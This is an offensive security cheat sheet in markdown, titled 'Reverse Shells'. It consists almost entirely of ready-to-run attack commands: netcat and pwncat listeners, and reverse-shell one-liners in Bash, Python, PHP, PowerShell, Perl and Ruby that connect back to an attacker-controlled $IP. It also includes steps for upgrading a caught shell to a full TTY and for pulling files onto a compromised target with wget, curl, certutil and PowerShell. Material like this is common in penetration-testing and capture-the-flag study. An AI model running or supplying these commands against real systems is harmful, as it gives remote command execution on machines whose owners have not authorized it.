# Reverse Shells

## Listeners

```bash
# netcat
nc -lvnp 4444
# rlwrap (arrow keys + history)
rlwrap nc -lvnp 4444
# pwncat (auto-upgrade + enumeration)
pwncat-cs -lp 4444
```

## One-Liners

### Bash
```bash
bash -i >& /dev/tcp/$IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("$IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

### Perl
```bash
perl -e 'use Socket;$i="$IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("$IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Shell Upgrade

### Step 1: Spawn PTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or
script /dev/null -c bash
```

### Step 2: Background + stty
```bash
# Ctrl+Z to background
stty raw -echo; fg
# then:
reset
export TERM=xterm
stty rows 40 cols 160
```

## File Transfer

### Python HTTP server (attacker)
```bash
python3 -m http.server 8000
```

### Download on target
```bash
# Linux
wget http://$IP:8000/file -O /tmp/file
curl http://$IP:8000/file -o /tmp/file

# Windows
certutil -urlcache -f http://$IP:8000/file C:\Temp\file
iwr -uri http://$IP:8000/file -outfile C:\Temp\file
```

### Base64 transfer (no network tools)
```bash
# attacker: encode
base64 -w0 file > file.b64
# target: decode
echo "BASE64STRING" | base64 -d > file
```
